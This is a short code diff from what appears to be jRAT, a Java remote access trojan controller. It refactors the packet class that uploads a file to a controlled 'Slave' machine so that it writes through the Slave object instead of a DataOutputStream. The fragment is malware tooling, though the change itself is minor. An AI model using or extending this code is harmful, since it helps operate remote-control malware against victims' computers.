@@ -3,7 +3,6 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 import jrat.controller.threads.ThreadUploadFile;
 
-import java.io.DataOutputStream;
 import java.io.File;
 
 public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
@@ -32,10 +31,10 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 	}
 	
 	@Override
-	public void write(final Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeBoolean(temp);
+	public void write(final Slave slave) throws Exception {
+		slave.writeBoolean(temp);
 		slave.writeLine(remoteFile);
-		dos.writeLong(file.length());
+		slave.writeLong(file.length());
 
 		if (file.exists() && file.isFile()) {
 			thread.setSlave(slave);
